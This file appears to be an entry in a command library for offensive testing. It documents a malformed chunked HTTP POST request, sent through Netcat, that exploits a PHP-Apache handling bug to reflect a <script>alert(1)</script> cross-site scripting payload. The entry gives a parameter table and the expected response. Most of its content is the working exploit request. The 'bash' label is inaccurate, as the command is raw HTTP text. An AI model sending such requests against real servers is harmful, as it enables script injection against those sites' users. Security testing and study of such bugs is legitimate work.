---
id: cmd-send-chunked-xss
type: command
executor: bash
data: >-
  POST /lol.php HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (Macintosh;
  Intel Mac OS X 10.14; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept-Language:
  en-US,en;q=0.5\nContent-Type: application/json\nUpgrade-Insecure-Requests:
  1\nCache-Control: max-age=0\nTransfer-Encoding: chunked\nContent-Length:
  25\n\n12<script>alert(1)</script>
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:31.868Z'
platforms:
  - Linux
  - macOS
tags:
  - xss
  - http
  - exploit
verified: false
validated: true
submitted: true
---

# send-chunked-xss-request

## Command

```bash
POST /lol.php HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/json\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\nTransfer-Encoding: chunked\nContent-Length: 25\n\n12<script>alert(1)</script>
```

## Description

Sends a malformed HTTP POST request with chunked encoding and embedded XSS payload to exploit PHP-Apache brigade handling, input as raw text in a Netcat session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /lol.php | Target endpoint path | Yes |
| localhost | Host header | Yes |
| 25 | Mismatched Content-Length to trigger bug | Yes |
| 12 | Chunk size before payload | Yes |
| <script>alert(1)</script> | XSS payload | Yes |

## Examples

### Basic Usage

```bash
POST /lol.php HTTP/1.1\n... (full request)
```

### Advanced Usage

```bash
POST /index.php HTTP/1.1\n... (customize payload)
```

## Expected Output

HTTP/1.1 400 Bad Request\n...\n<html>error</html><script>alert(1)</script>\r\n
## Related

- [[commands/nc-connect-http]]
- [[procedures/Send-Crafted-Chunked-POST-Request-with-XSS-Payload]]
